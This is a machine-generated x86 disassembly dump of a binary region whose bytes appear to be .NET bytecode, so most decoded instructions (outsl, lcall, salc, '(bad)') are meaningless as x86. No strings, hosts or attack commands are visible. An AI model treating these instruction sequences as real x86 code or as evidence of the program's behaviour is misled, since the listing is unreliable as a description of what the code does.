  40419f:	00 b4 07 00 00 b4 07 	add    %dh,0x7b40000(%edi,%eax,1)
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	1b 00                	sbb    (%eax),%eax
  4041aa:	00 00                	add    %al,(%eax)
  4041ac:	29 00                	sub    %eax,(%eax)
  4041ae:	00 01                	add    %al,(%ecx)
  4041b0:	1b 30                	sbb    (%eax),%esi
  4041b2:	0a 00                	or     (%eax),%al
  4041b4:	b2 04                	mov    $0x4,%dl
  4041b6:	00 00                	add    %al,(%eax)
  4041b8:	24 00                	and    $0x0,%al
  4041ba:	00 11                	add    %dl,(%ecx)
  4041bc:	28 d3                	sub    %dl,%bl
  4041be:	00 00                	add    %al,(%eax)
  4041c0:	0a 02                	or     (%edx),%al
  4041c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c3:	d4 00                	aam    $0x0
  4041c5:	00 0a                	add    %cl,(%edx)
  4041c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c8:	d5 00                	aad    $0x0
  4041ca:	00 0a                	add    %cl,(%edx)
  4041cc:	13 05 16 13 04 38    	adc    0x38041316,%eax
  4041d2:	67 04 00             	addr16 add $0x0,%al
  4041d5:	00 11                	add    %dl,(%ecx)
  4041d7:	05 11 04 9a 0a       	add    $0xa9a0411,%eax
  4041dc:	06                   	push   %es
  4041dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4041de:	d6                   	salc
  4041df:	00 00                	add    %al,(%eax)
  4041e1:	0a 72 bd             	or     -0x43(%edx),%dh
  4041e4:	0a 00                	or     (%eax),%al
  4041e6:	70 16                	jo     0x4041fe
  4041e8:	28 5b 00             	sub    %bl,0x0(%ebx)
  4041eb:	00 0a                	add    %cl,(%edx)
  4041ed:	16                   	push   %ss
  4041ee:	40                   	inc    %eax
  4041ef:	44                   	inc    %esp
  4041f0:	04 00                	add    $0x0,%al
  4041f2:	00 06                	add    %al,(%esi)
  4041f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f5:	d7                   	xlat   %ds:(%ebx)
  4041f6:	00 00                	add    %al,(%eax)
  4041f8:	0a 13                	or     (%ebx),%dl
  4041fa:	07                   	pop    %es
  4041fb:	16                   	push   %ss
  4041fc:	13 06                	adc    (%esi),%eax
  4041fe:	38 29                	cmp    %ch,(%ecx)
  404200:	04 00                	add    $0x0,%al
  404202:	00 11                	add    %dl,(%ecx)
  404204:	07                   	pop    %es
  404205:	11 06                	adc    %eax,(%esi)
  404207:	9a 0b 07 14 72 47 07 	lcall  $0x747,$0x7214070b
  40420e:	00 70 16             	add    %dh,0x16(%eax)
  404211:	8d 03                	lea    (%ebx),%eax
  404213:	00 00                	add    %al,(%eax)
  404215:	01 14 14             	add    %edx,(%esp,%edx,1)
  404218:	14 28                	adc    $0x28,%al
  40421a:	41                   	inc    %ecx
  40421b:	00 00                	add    %al,(%eax)
  40421d:	0a 72 cb             	or     -0x35(%edx),%dh
  404220:	0a 00                	or     (%eax),%al
  404222:	70 16                	jo     0x40423a
  404224:	28 d8                	sub    %bl,%al
  404226:	00 00                	add    %al,(%eax)
  404228:	0a 2c 65 07 14 72 d3 	or     -0x2c8debf9(,%eiz,2),%ch
  40422f:	0a 00                	or     (%eax),%al
  404231:	70 18                	jo     0x40424b
  404233:	8d 03                	lea    (%ebx),%eax
  404235:	00 00                	add    %al,(%eax)
  404237:	01 13                	add    %edx,(%ebx)
  404239:	09 11                	or     %edx,(%ecx)
  40423b:	09 16                	or     %edx,(%esi)
  40423d:	14 a2                	adc    $0xa2,%al
  40423f:	11 09                	adc    %ecx,(%ecx)
  404241:	17                   	pop    %ss
  404242:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  404248:	13 08                	adc    (%eax),%ecx
  40424a:	11 08                	adc    %ecx,(%eax)
  40424c:	16                   	push   %ss
  40424d:	7e 07                	jle    0x404256
  40424f:	00 00                	add    %al,(%eax)
  404251:	04 a2                	add    $0xa2,%al
  404253:	11 08                	adc    %ecx,(%eax)
  404255:	17                   	pop    %ss
  404256:	7e 08                	jle    0x404260
  404258:	00 00                	add    %al,(%eax)
  40425a:	04 a2                	add    $0xa2,%al
  40425c:	11 08                	adc    %ecx,(%eax)
  40425e:	18 7e 0a             	sbb    %bh,0xa(%esi)
  404261:	00 00                	add    %al,(%eax)
  404263:	04 a2                	add    $0xa2,%al
  404265:	11 08                	adc    %ecx,(%eax)
  404267:	19 7e 09             	sbb    %edi,0x9(%esi)
  40426a:	00 00                	add    %al,(%eax)
  40426c:	04 a2                	add    $0xa2,%al
  40426e:	11 08                	adc    %ecx,(%eax)
  404270:	1a 28                	sbb    (%eax),%ch
  404272:	72 00                	jb     0x404274
  404274:	00 06                	add    %al,(%esi)
  404276:	a2 11 08 a2 11       	mov    %al,0x11a20811
  40427b:	09 14 14             	or     %edx,(%esp,%edx,1)
  40427e:	14 17                	adc    $0x17,%al
  404280:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404284:	0a 26                	or     (%esi),%ah
  404286:	dd e2                	fucom  %st(2)
  404288:	03 00                	add    (%eax),%eax
  40428a:	00 38                	add    %bh,(%eax)
  40428c:	96                   	xchg   %eax,%esi
  40428d:	03 00                	add    (%eax),%eax
  40428f:	00 07                	add    %al,(%edi)
  404291:	14 72                	adc    $0x72,%al
  404293:	47                   	inc    %edi
  404294:	07                   	pop    %es
  404295:	00 70 16             	add    %dh,0x16(%eax)
  404298:	8d 03                	lea    (%ebx),%eax
  40429a:	00 00                	add    %al,(%eax)
  40429c:	01 14 14             	add    %edx,(%esp,%edx,1)
  40429f:	14 28                	adc    $0x28,%al
  4042a1:	41                   	inc    %ecx
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	0a 72 e1             	or     -0x1f(%edx),%dh
  4042a7:	0a 00                	or     (%eax),%al
  4042a9:	70 16                	jo     0x4042c1
  4042ab:	28 d8                	sub    %bl,%al
  4042ad:	00 00                	add    %al,(%eax)
  4042af:	0a 39                	or     (%ecx),%bh
  4042b1:	9d                   	popf
  4042b2:	00 00                	add    %al,(%eax)
  4042b4:	00 72 f9             	add    %dh,-0x7(%edx)
  4042b7:	0a 00                	or     (%eax),%al
  4042b9:	70 7e                	jo     0x404339
  4042bb:	0a 00                	or     (%eax),%al
  4042bd:	00 04 28             	add    %al,(%eax,%ebp,1)
  4042c0:	1f                   	pop    %ds
  4042c1:	00 00                	add    %al,(%eax)
  4042c3:	0a 28                	or     (%eax),%ch
  4042c5:	72 00                	jb     0x4042c7
  4042c7:	00 06                	add    %al,(%esi)
  4042c9:	28 1f                	sub    %bl,(%edi)
  4042cb:	00 00                	add    %al,(%eax)
  4042cd:	0a 7e 0a             	or     0xa(%esi),%bh
  4042d0:	00 00                	add    %al,(%eax)
  4042d2:	04 28                	add    $0x28,%al
  4042d4:	1f                   	pop    %ds
  4042d5:	00 00                	add    %al,(%eax)
  4042d7:	0a 7e 1d             	or     0x1d(%esi),%bh
  4042da:	00 00                	add    %al,(%eax)
  4042dc:	04 18                	add    $0x18,%al
  4042de:	9a 28 d9 00 00 0a 28 	lcall  $0x280a,$0xd928
  4042e5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4042e6:	00 00                	add    %al,(%eax)
  4042e8:	0a 28                	or     (%eax),%ch
  4042ea:	1f                   	pop    %ds
  4042eb:	00 00                	add    %al,(%eax)
  4042ed:	0a 7e 0a             	or     0xa(%esi),%bh
  4042f0:	00 00                	add    %al,(%eax)
  4042f2:	04 28                	add    $0x28,%al
  4042f4:	1f                   	pop    %ds
  4042f5:	00 00                	add    %al,(%eax)
  4042f7:	0a 07                	or     (%edi),%al
  4042f9:	14 72                	adc    $0x72,%al
  4042fb:	d3 0a                	rorl   %cl,(%edx)
  4042fd:	00 70 18             	add    %dh,0x18(%eax)
  404300:	8d 03                	lea    (%ebx),%eax
  404302:	00 00                	add    %al,(%eax)
  404304:	01 13                	add    %edx,(%ebx)
  404306:	08 11                	or     %dl,(%ecx)
  404308:	08 16                	or     %dl,(%esi)
  40430a:	14 a2                	adc    $0xa2,%al
  40430c:	11 08                	adc    %ecx,(%eax)
  40430e:	17                   	pop    %ss
  40430f:	17                   	pop    %ss
  404310:	8d 03                	lea    (%ebx),%eax
  404312:	00 00                	add    %al,(%eax)
  404314:	01 13                	add    %edx,(%ebx)
  404316:	09 11                	or     %edx,(%ecx)
  404318:	09 16                	or     %edx,(%esi)
  40431a:	7e 1d                	jle    0x404339
  40431c:	00 00                	add    %al,(%eax)
  40431e:	04 18                	add    $0x18,%al
  404320:	9a 28 d9 00 00 0a 8c 	lcall  $0x8c0a,$0xd928
  404327:	7d 00                	jge    0x404329
  404329:	00 01                	add    %al,(%ecx)
  40432b:	a2 11 09 a2 11       	mov    %al,0x11a20911
  404330:	08 14 14             	or     %dl,(%esp,%edx,1)
  404333:	14 28                	adc    $0x28,%al
  404335:	41                   	inc    %ecx
  404336:	00 00                	add    %al,(%eax)
  404338:	0a 28                	or     (%eax),%ch
  40433a:	91                   	xchg   %eax,%ecx
  40433b:	00 00                	add    %al,(%eax)
  40433d:	0a 28                	or     (%eax),%ch
  40433f:	23 00                	and    (%eax),%eax
  404341:	00 0a                	add    %cl,(%edx)
  404343:	28 2f                	sub    %ch,(%edi)
  404345:	00 00                	add    %al,(%eax)
  404347:	06                   	push   %es
  404348:	dd 20                	frstor (%eax)
  40434a:	03 00                	add    (%eax),%eax
  40434c:	00 38                	add    %bh,(%eax)
  40434e:	d4 02                	aam    $0x2
  404350:	00 00                	add    %al,(%eax)
  404352:	07                   	pop    %es
  404353:	14 72                	adc    $0x72,%al
  404355:	47                   	inc    %edi
  404356:	07                   	pop    %es
  404357:	00 70 16             	add    %dh,0x16(%eax)
  40435a:	8d 03                	lea    (%ebx),%eax
  40435c:	00 00                	add    %al,(%eax)
  40435e:	01 14 14             	add    %edx,(%esp,%edx,1)
  404361:	14 28                	adc    $0x28,%al
  404363:	41                   	inc    %ecx
  404364:	00 00                	add    %al,(%eax)
  404366:	0a 72 0b             	or     0xb(%edx),%dh
  404369:	0b 00                	or     (%eax),%eax
  40436b:	70 16                	jo     0x404383
  40436d:	28 d8                	sub    %bl,%al
  40436f:	00 00                	add    %al,(%eax)
  404371:	0a 2c 62             	or     (%edx,%eiz,2),%ch
  404374:	07                   	pop    %es
  404375:	14 72                	adc    $0x72,%al
  404377:	d3 0a                	rorl   %cl,(%edx)
  404379:	00 70 18             	add    %dh,0x18(%eax)
  40437c:	8d 03                	lea    (%ebx),%eax
  40437e:	00 00                	add    %al,(%eax)
  404380:	01 13                	add    %edx,(%ebx)
  404382:	08 11                	or     %dl,(%ecx)
  404384:	08 16                	or     %dl,(%esi)
  404386:	14 a2                	adc    $0xa2,%al
  404388:	11 08                	adc    %ecx,(%eax)
  40438a:	17                   	pop    %ss
  40438b:	17                   	pop    %ss
  40438c:	8d 03                	lea    (%ebx),%eax
  40438e:	00 00                	add    %al,(%eax)
  404390:	01 13                	add    %edx,(%ebx)
  404392:	09 11                	or     %edx,(%ecx)
  404394:	09 16                	or     %edx,(%esi)
  404396:	7e 1d                	jle    0x4043b5
  404398:	00 00                	add    %al,(%eax)
  40439a:	04 18                	add    $0x18,%al
  40439c:	9a a2 11 09 a2 11 08 	lcall  $0x811,$0xa20911a2
  4043a3:	14 14                	adc    $0x14,%al
  4043a5:	14 28                	adc    $0x28,%al
  4043a7:	41                   	inc    %ecx
  4043a8:	00 00                	add    %al,(%eax)
  4043aa:	0a 28                	or     (%eax),%ch
  4043ac:	23 00                	and    (%eax),%eax
  4043ae:	00 0a                	add    %cl,(%edx)
  4043b0:	0c 08                	or     $0x8,%al
  4043b2:	72 5d                	jb     0x404411
  4043b4:	06                   	push   %es
  4043b5:	00 70 6f             	add    %dh,0x6f(%eax)
  4043b8:	da 00                	fiaddl (%eax)
  4043ba:	00 0a                	add    %cl,(%edx)
  4043bc:	2c 08                	sub    $0x8,%al
  4043be:	08 28                	or     %ch,(%eax)
  4043c0:	3a 00                	cmp    (%eax),%al
  4043c2:	00 06                	add    %al,(%esi)
  4043c4:	2b 06                	sub    (%esi),%eax
  4043c6:	08 28                	or     %ch,(%eax)
  4043c8:	39 00                	cmp    %eax,(%eax)
  4043ca:	00 06                	add    %al,(%esi)
  4043cc:	dd 9c 02 00 00 38 50 	fstpl  0x50380000(%edx,%eax,1)
  4043d3:	02 00                	add    (%eax),%al
  4043d5:	00 07                	add    %al,(%edi)
  4043d7:	14 72                	adc    $0x72,%al
  4043d9:	47                   	inc    %edi
  4043da:	07                   	pop    %es
  4043db:	00 70 16             	add    %dh,0x16(%eax)
  4043de:	8d 03                	lea    (%ebx),%eax
  4043e0:	00 00                	add    %al,(%eax)
  4043e2:	01 14 14             	add    %edx,(%esp,%edx,1)
  4043e5:	14 28                	adc    $0x28,%al
  4043e7:	41                   	inc    %ecx
  4043e8:	00 00                	add    %al,(%eax)
  4043ea:	0a 72 21             	or     0x21(%edx),%dh
  4043ed:	0b 00                	or     (%eax),%eax
  4043ef:	70 16                	jo     0x404407
  4043f1:	28 d8                	sub    %bl,%al
  4043f3:	00 00                	add    %al,(%eax)
  4043f5:	0a 2c 66             	or     (%esi,%eiz,2),%ch
  4043f8:	7e 1d                	jle    0x404417
  4043fa:	00 00                	add    %al,(%eax)
  4043fc:	04 18                	add    $0x18,%al
  4043fe:	9a 28 2e 00 00 0a 2c 	lcall  $0x2c0a,$0x2e28
  404405:	4e                   	dec    %esi
  404406:	07                   	pop    %es
  404407:	14 72                	adc    $0x72,%al
  404409:	d3 0a                	rorl   %cl,(%edx)
  40440b:	00 70 18             	add    %dh,0x18(%eax)
  40440e:	8d 03                	lea    (%ebx),%eax
  404410:	00 00                	add    %al,(%eax)
  404412:	01 13                	add    %edx,(%ebx)
  404414:	08 11                	or     %dl,(%ecx)
  404416:	08 16                	or     %dl,(%esi)
  404418:	14 a2                	adc    $0xa2,%al
  40441a:	11 08                	adc    %ecx,(%eax)
  40441c:	17                   	pop    %ss
  40441d:	18 8d 03 00 00 01    	sbb    %cl,0x1000003(%ebp)
  404423:	13 09                	adc    (%ecx),%ecx
  404425:	11 09                	adc    %ecx,(%ecx)
  404427:	16                   	push   %ss
  404428:	7e 1d                	jle    0x404447
  40442a:	00 00                	add    %al,(%eax)
  40442c:	04 18                	add    $0x18,%al
  40442e:	9a a2 11 09 17 7e 1d 	lcall  $0x1d7e,$0x170911a2
  404435:	00 00                	add    %al,(%eax)
  404437:	04 19                	add    $0x19,%al
  404439:	9a 28 b2 00 00 0a 28 	lcall  $0x280a,$0xb228
  404440:	76 00                	jbe    0x404442
  404442:	00 06                	add    %al,(%esi)
  404444:	a2 11 09 a2 11       	mov    %al,0x11a20911
  404449:	08 14 14             	or     %dl,(%esp,%edx,1)
  40444c:	14 17                	adc    $0x17,%al
  40444e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404452:	0a 26                	or     (%esi),%ah
  404454:	dd 14 02             	fstl   (%edx,%eax,1)
  404457:	00 00                	add    %al,(%eax)
  404459:	38 c8                	cmp    %cl,%al
  40445b:	01 00                	add    %eax,(%eax)
  40445d:	00 07                	add    %al,(%edi)
  40445f:	14 72                	adc    $0x72,%al
  404461:	47                   	inc    %edi
  404462:	07                   	pop    %es
  404463:	00 70 16             	add    %dh,0x16(%eax)
  404466:	8d 03                	lea    (%ebx),%eax
  404468:	00 00                	add    %al,(%eax)
  40446a:	01 14 14             	add    %edx,(%esp,%edx,1)
  40446d:	14 28                	adc    $0x28,%al
  40446f:	41                   	inc    %ecx
  404470:	00 00                	add    %al,(%eax)
  404472:	0a 72 2f             	or     0x2f(%edx),%dh
  404475:	0b 00                	or     (%eax),%eax
  404477:	70 16                	jo     0x40448f
  404479:	28 d8                	sub    %bl,%al
  40447b:	00 00                	add    %al,(%eax)
  40447d:	0a 2c 55 07 14 72 d3 	or     -0x2c8debf9(,%edx,2),%ch
  404484:	0a 00                	or     (%eax),%al
  404486:	70 18                	jo     0x4044a0
  404488:	8d 03                	lea    (%ebx),%eax
  40448a:	00 00                	add    %al,(%eax)
  40448c:	01 13                	add    %edx,(%ebx)
  40448e:	08 11                	or     %dl,(%ecx)
  404490:	08 16                	or     %dl,(%esi)
  404492:	14 a2                	adc    $0xa2,%al
  404494:	11 08                	adc    %ecx,(%eax)
  404496:	17                   	pop    %ss
  404497:	17                   	pop    %ss
  404498:	8d 03                	lea    (%ebx),%eax
  40449a:	00 00                	add    %al,(%eax)
  40449c:	01 13                	add    %edx,(%ebx)
  40449e:	09 11                	or     %edx,(%ecx)
  4044a0:	09 16                	or     %edx,(%esi)
  4044a2:	7e 1d                	jle    0x4044c1
  4044a4:	00 00                	add    %al,(%eax)
  4044a6:	04 18                	add    $0x18,%al
  4044a8:	9a 28 d9 00 00 0a 8c 	lcall  $0x8c0a,$0xd928
  4044af:	7d 00                	jge    0x4044b1
  4044b1:	00 01                	add    %al,(%ecx)
  4044b3:	a2 11 09 a2 11       	mov    %al,0x11a20911
  4044b8:	08 14 14             	or     %dl,(%esp,%edx,1)
  4044bb:	14 28                	adc    $0x28,%al
  4044bd:	41                   	inc    %ecx
  4044be:	00 00                	add    %al,(%eax)
  4044c0:	0a 28                	or     (%eax),%ch
  4044c2:	23 00                	and    (%eax),%eax
  4044c4:	00 0a                	add    %cl,(%edx)
  4044c6:	28 3a                	sub    %bh,(%edx)
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	06                   	push   %es
  4044cb:	dd 9d 01 00 00 38    	fstpl  0x38000001(%ebp)
  4044d1:	51                   	push   %ecx
  4044d2:	01 00                	add    %eax,(%eax)
  4044d4:	00 07                	add    %al,(%edi)
  4044d6:	14 72                	adc    $0x72,%al
  4044d8:	47                   	inc    %edi
  4044d9:	07                   	pop    %es
  4044da:	00 70 16             	add    %dh,0x16(%eax)
  4044dd:	8d 03                	lea    (%ebx),%eax
  4044df:	00 00                	add    %al,(%eax)
  4044e1:	01 14 14             	add    %edx,(%esp,%edx,1)
  4044e4:	14 28                	adc    $0x28,%al
  4044e6:	41                   	inc    %ecx
  4044e7:	00 00                	add    %al,(%eax)
  4044e9:	0a 72 3f             	or     0x3f(%edx),%dh
  4044ec:	0b 00                	or     (%eax),%eax
  4044ee:	70 16                	jo     0x404506
  4044f0:	28 d8                	sub    %bl,%al
  4044f2:	00 00                	add    %al,(%eax)
  4044f4:	0a 39                	or     (%ecx),%bh
  4044f6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4044f7:	00 00                	add    %al,(%eax)
  4044f9:	00 7e 1d             	add    %bh,0x1d(%esi)
  4044fc:	00 00                	add    %al,(%eax)
  4044fe:	04 18                	add    $0x18,%al
  404500:	9a 28 db 00 00 0a 39 	lcall  $0x390a,$0xdb28
  404507:	91                   	xchg   %eax,%ecx
  404508:	00 00                	add    %al,(%eax)
  40450a:	00 7e 1e             	add    %bh,0x1e(%esi)
  40450d:	00 00                	add    %al,(%eax)
  40450f:	04 17                	add    $0x17,%al
  404511:	3b 81 00 00 00 17    	cmp    0x17000000(%ecx),%eax
  404517:	80 1e 00             	sbbb   $0x0,(%esi)
  40451a:	00 04 07             	add    %al,(%edi,%eax,1)
  40451d:	14 72                	adc    $0x72,%al
  40451f:	d3 0a                	rorl   %cl,(%edx)
  404521:	00 70 18             	add    %dh,0x18(%eax)
  404524:	8d 03                	lea    (%ebx),%eax
  404526:	00 00                	add    %al,(%eax)
  404528:	01 13                	add    %edx,(%ebx)
  40452a:	08 11                	or     %dl,(%ecx)
  40452c:	08 16                	or     %dl,(%esi)
  40452e:	14 a2                	adc    $0xa2,%al
  404530:	11 08                	adc    %ecx,(%eax)
  404532:	17                   	pop    %ss
  404533:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  404539:	13 09                	adc    (%ecx),%ecx
  40453b:	11 09                	adc    %ecx,(%ecx)
  40453d:	16                   	push   %ss
  40453e:	28 72 00             	sub    %dh,0x0(%edx)
  404541:	00 06                	add    %al,(%esi)
  404543:	a2 11 09 17 7e       	mov    %al,0x7e170911
  404548:	1d 00 00 04 19       	sbb    $0x19040000,%eax
  40454d:	9a 28 b2 00 00 0a 28 	lcall  $0x280a,$0xb228
  404554:	76 00                	jbe    0x404556
  404556:	00 06                	add    %al,(%esi)
  404558:	a2 11 09 18 7e       	mov    %al,0x7e180911
  40455d:	1d 00 00 04 1a       	sbb    $0x1a040000,%eax
  404562:	9a a2 11 09 19 7e 1d 	lcall  $0x1d7e,$0x190911a2
  404569:	00 00                	add    %al,(%eax)
  40456b:	04 1b                	add    $0x1b,%al
  40456d:	9a a2 11 09 1a 7e 1d 	lcall  $0x1d7e,$0x1a0911a2
  404574:	00 00                	add    %al,(%eax)
  404576:	04 1c                	add    $0x1c,%al
  404578:	9a a2 11 09 a2 11 08 	lcall  $0x811,$0xa20911a2
  40457f:	14 14                	adc    $0x14,%al
  404581:	14 28                	adc    $0x28,%al
  404583:	41                   	inc    %ecx
  404584:	00 00                	add    %al,(%eax)
  404586:	0a 28                	or     (%eax),%ch
  404588:	23 00                	and    (%eax),%eax
  40458a:	00 0a                	add    %cl,(%edx)
  40458c:	28 39                	sub    %bh,(%ecx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	06                   	push   %es
  404591:	18 80 1e 00 00 04    	sbb    %al,0x400001e(%eax)
  404597:	dd d1                	fst    %st(1)
  404599:	00 00                	add    %al,(%eax)
  40459b:	00 38                	add    %bh,(%eax)
  40459d:	85 00                	test   %eax,(%eax)
  40459f:	00 00                	add    %al,(%eax)
  4045a1:	07                   	pop    %es
  4045a2:	14 72                	adc    $0x72,%al
  4045a4:	47                   	inc    %edi
  4045a5:	07                   	pop    %es
  4045a6:	00 70 16             	add    %dh,0x16(%eax)
  4045a9:	8d 03                	lea    (%ebx),%eax
  4045ab:	00 00                	add    %al,(%eax)
  4045ad:	01 14 14             	add    %edx,(%esp,%edx,1)
  4045b0:	14 28                	adc    $0x28,%al
  4045b2:	41                   	inc    %ecx
  4045b3:	00 00                	add    %al,(%eax)
  4045b5:	0a 72 47             	or     0x47(%edx),%dh
  4045b8:	0b 00                	or     (%eax),%eax
  4045ba:	70 16                	jo     0x4045d2
  4045bc:	28 d8                	sub    %bl,%al
  4045be:	00 00                	add    %al,(%eax)
  4045c0:	0a 2c 63             	or     (%ebx,%eiz,2),%ch
  4045c3:	7e 1d                	jle    0x4045e2
  4045c5:	00 00                	add    %al,(%eax)
  4045c7:	04 18                	add    $0x18,%al
  4045c9:	9a 28 db 00 00 0a 2d 	lcall  $0x2d0a,$0xdb28
  4045d0:	55                   	push   %ebp
  4045d1:	7e 1e                	jle    0x4045f1
  4045d3:	00 00                	add    %al,(%eax)
  4045d5:	04 18                	add    $0x18,%al
  4045d7:	33 4b 17             	xor    0x17(%ebx),%ecx
  4045da:	80 1e 00             	sbbb   $0x0,(%esi)
  4045dd:	00 04 07             	add    %al,(%edi,%eax,1)
  4045e0:	14 72                	adc    $0x72,%al
  4045e2:	d3 0a                	rorl   %cl,(%edx)
  4045e4:	00 70 18             	add    %dh,0x18(%eax)
  4045e7:	8d 03                	lea    (%ebx),%eax
  4045e9:	00 00                	add    %al,(%eax)
  4045eb:	01 13                	add    %edx,(%ebx)
  4045ed:	08 11                	or     %dl,(%ecx)
  4045ef:	08 16                	or     %dl,(%esi)
  4045f1:	14 a2                	adc    $0xa2,%al
  4045f3:	11 08                	adc    %ecx,(%eax)
  4045f5:	17                   	pop    %ss
  4045f6:	17                   	pop    %ss
  4045f7:	8d 03                	lea    (%ebx),%eax
  4045f9:	00 00                	add    %al,(%eax)
  4045fb:	01 13                	add    %edx,(%ebx)
  4045fd:	09 11                	or     %edx,(%ecx)
  4045ff:	09 16                	or     %edx,(%esi)
  404601:	28 72 00             	sub    %dh,0x0(%edx)
  404604:	00 06                	add    %al,(%esi)
  404606:	a2 11 09 a2 11       	mov    %al,0x11a20911
  40460b:	08 14 14             	or     %dl,(%esp,%edx,1)
  40460e:	14 28                	adc    $0x28,%al
  404610:	41                   	inc    %ecx
  404611:	00 00                	add    %al,(%eax)
  404613:	0a 28                	or     (%eax),%ch
  404615:	23 00                	and    (%eax),%eax
  404617:	00 0a                	add    %cl,(%edx)
  404619:	28 39                	sub    %bh,(%ecx)
  40461b:	00 00                	add    %al,(%eax)
  40461d:	06                   	push   %es
  40461e:	16                   	push   %ss
  40461f:	80 1e 00             	sbbb   $0x0,(%esi)
  404622:	00 04 de             	add    %al,(%esi,%ebx,8)
  404625:	47                   	inc    %edi
  404626:	11 06                	adc    %eax,(%esi)
  404628:	17                   	pop    %ss
  404629:	d6                   	salc
  40462a:	13 06                	adc    (%esi),%eax
  40462c:	11 06                	adc    %eax,(%esi)
  40462e:	11 07                	adc    %eax,(%edi)
  404630:	8e b7 3f cc fb ff    	mov    -0x433c1(%edi),%?
  404636:	ff 11                	call   *(%ecx)
  404638:	04 17                	add    $0x17,%al
  40463a:	d6                   	salc
  40463b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40463e:	04 11                	add    $0x11,%al
  404640:	05 8e b7 3f 8e       	add    $0x8e3fb78e,%eax
  404645:	fb                   	sti
  404646:	ff                   	(bad)
  404647:	ff                   	lcall  (bad)
  404648:	de 23                	fisubs (%ebx)
  40464a:	25 28 25 00 00       	and    $0x2528,%eax
  40464f:	0a 0d 72 4f 0b 00    	or     0xb4f72,%cl
  404655:	70 09                	jo     0x404660
  404657:	6f                   	outsl  %ds:(%esi),(%dx)
  404658:	bf 00 00 0a 28       	mov    $0x280a0000,%edi
  40465d:	1f                   	pop    %ds
  40465e:	00 00                	add    %al,(%eax)
  404660:	0a 28                	or     (%eax),%ch
  404662:	3a 00                	cmp    (%eax),%al
  404664:	00 06                	add    %al,(%esi)
  404666:	28 27                	sub    %ah,(%edi)
  404668:	00 00                	add    %al,(%eax)
  40466a:	0a de                	or     %dh,%bl
  40466c:	00 2a                	add    %ch,(%edx)
  40466e:	00 00                	add    %al,(%eax)
  404670:	41                   	inc    %ecx
  404671:	1c 00                	sbb    $0x0,%al
	...
  40467b:	00 8e 04 00 00 8e    	add    %cl,-0x71fffffc(%esi)
  404681:	04 00                	add    $0x0,%al
  404683:	00 23                	add    %ah,(%ebx)
  404685:	00 00                	add    %al,(%eax)
  404687:	00 29                	add    %ch,(%ecx)
  404689:	00 00                	add    %al,(%eax)
  40468b:	01 1b                	add    %ebx,(%ebx)
  40468d:	30 03                	xor    %al,(%ebx)
  40468f:	00 26                	add    %ah,(%esi)
  404691:	00 00                	add    %al,(%eax)
  404693:	00 25 00 00 11 72    	add    %ah,0x72110000
  404699:	6d                   	insl   (%dx),%es:(%edi)
  40469a:	0b 00                	or     (%eax),%eax
  40469c:	70 7e                	jo     0x40471c
  40469e:	0a 00                	or     (%eax),%al
  4046a0:	00 04 02             	add    %al,(%edx,%eax,1)
  4046a3:	28 28                	sub    %ch,(%eax)
  4046a5:	00 00                	add    %al,(%eax)
  4046a7:	0a 28                	or     (%eax),%ch
  4046a9:	2f                   	das
  4046aa:	00 00                	add    %al,(%eax)
  4046ac:	06                   	push   %es
  4046ad:	de 0e                	fimuls (%esi)
  4046af:	25 28 25 00 00       	and    $0x2528,%eax
  4046b4:	0a 0a                	or     (%edx),%cl
  4046b6:	28 27                	sub    %ah,(%edi)
  4046b8:	00 00                	add    %al,(%eax)
  4046ba:	0a de                	or     %dh,%bl
  4046bc:	00 2a                	add    %ch,(%edx)
  4046be:	00 00                	add    %al,(%eax)
  4046c0:	01 10                	add    %edx,(%eax)
  4046c2:	00 00                	add    %al,(%eax)
  4046c4:	00 00                	add    %al,(%eax)
  4046c6:	00 00                	add    %al,(%eax)
  4046c8:	17                   	pop    %ss
  4046c9:	17                   	pop    %ss
  4046ca:	00 0e                	add    %cl,(%esi)
  4046cc:	29 00                	sub    %eax,(%eax)
  4046ce:	00 01                	add    %al,(%ecx)
  4046d0:	1b 30                	sbb    (%eax),%esi
  4046d2:	03 00                	add    (%eax),%eax
  4046d4:	26 00 00             	add    %al,%es:(%eax)
  4046d7:	00 26                	add    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	11 72 5d             	adc    %esi,0x5d(%edx)
  4046de:	06                   	push   %es
  4046df:	00 70 7e             	add    %dh,0x7e(%eax)
  4046e2:	0a 00                	or     (%eax),%al
  4046e4:	00 04 02             	add    %al,(%edx,%eax,1)
  4046e7:	28 28                	sub    %ch,(%eax)
  4046e9:	00 00                	add    %al,(%eax)
  4046eb:	0a 28                	or     (%eax),%ch
  4046ed:	2f                   	das
  4046ee:	00 00                	add    %al,(%eax)
  4046f0:	06                   	push   %es
  4046f1:	de 0e                	fimuls (%esi)
  4046f3:	25 28 25 00 00       	and    $0x2528,%eax
  4046f8:	0a 0a                	or     (%edx),%cl
  4046fa:	28 27                	sub    %ah,(%edi)
  4046fc:	00 00                	add    %al,(%eax)
  4046fe:	0a de                	or     %dh,%bl
  404700:	00 2a                	add    %ch,(%edx)
  404702:	00 00                	add    %al,(%eax)
  404704:	01 10                	add    %edx,(%eax)
  404706:	00 00                	add    %al,(%eax)
  404708:	00 00                	add    %al,(%eax)
  40470a:	00 00                	add    %al,(%eax)
  40470c:	17                   	pop    %ss
  40470d:	17                   	pop    %ss
  40470e:	00 0e                	add    %cl,(%esi)
  404710:	29 00                	sub    %eax,(%eax)
  404712:	00 01                	add    %al,(%ecx)
  404714:	1b 30                	sbb    (%eax),%esi
  404716:	05 00 d4 00 00       	add    $0xd400,%eax
  40471b:	00 27                	add    %ah,(%edi)
  40471d:	00 00                	add    %al,(%eax)
  40471f:	11 73 84             	adc    %esi,-0x7c(%ebx)
  404722:	00 00                	add    %al,(%eax)
  404724:	06                   	push   %es
  404725:	0a 06                	or     (%esi),%al
